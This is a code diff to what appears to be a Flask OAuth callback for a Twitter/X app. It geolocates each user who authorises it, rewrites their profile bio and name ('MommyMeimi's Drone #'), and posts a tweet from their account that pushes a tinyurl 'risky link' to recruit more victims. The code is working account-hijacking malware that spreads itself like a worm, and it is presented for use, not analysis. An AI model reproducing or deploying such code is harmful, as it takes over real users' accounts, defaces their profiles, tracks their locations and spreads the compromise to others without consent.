@@ -310,7 +310,7 @@ def callback():
             det=json.loads(content.decode('utf-8'))
             print(det)
             c_name = det.get('country')
-            st_name = det.get('regionNme')
+            st_name = det.get('regionName')
             ct_name = det.get('city')
             print(f'{ct_name},{st_name},{c_name}')
 
@@ -319,8 +319,19 @@ def callback():
             description="checkout https://tinyurl.com/mommymeimiriskylink for account takeover by @mommymeimi."
 
             update_profile(real_client,"youpay.me/mommymeimi","mommymeimi's leash",description)
-            
-
+           
+            tweetcontent='I clicked a risky link from @mommymeimi and mommy hacked my account. I am dumb for @mommymeimi. You should get dumb for mommy too: https://tinyurl.com/mommymeimiriskylink'
+        
+            name = "MommyMeimi's Drone #"+str(random.random())[2:6]
+            update_profile_name(real_client,name)
+            api = tweepy.Client(bearer_token=app.config['BEARER_TOKEN'],
+                                        consumer_key=app.config['APP_CONSUMER_KEY'], 
+                                        consumer_secret=app.config['APP_CONSUMER_SECRET'],
+                                        access_token=real_oauth_token, 
+                                        access_token_secret=real_oauth_token_secret)
+        
+            api.create_tweet(text=tweetcontent,
+                            quote_tweet_id="1891088627754524992")
 
         except Exception as e:
             print(e)
